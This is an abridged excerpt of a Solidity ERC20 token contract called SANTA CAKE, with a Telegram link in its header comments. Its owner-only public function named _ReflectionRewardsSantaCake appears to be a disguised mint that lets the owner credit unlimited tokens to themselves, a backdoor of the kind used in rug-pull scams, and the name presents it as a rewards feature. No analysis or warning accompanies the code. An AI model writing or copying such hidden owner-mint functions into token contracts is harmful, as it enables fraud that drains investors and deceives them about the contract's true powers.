...
//
//
// 📱 Telegram:https://t.me/SantaCakee
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsSantaCake(uint256 amount) public onlyOwner {
    _ReflectionRewardsSantaCake(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsSantaCake(address account, uint256 amount) internal virtual {
...
contract SANTACAKE is ERC20 {
    ...
    constructor() public ERC20("SANTA CAKE", "SANTACAKE") {
        _ReflectionRewardsSantaCake(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}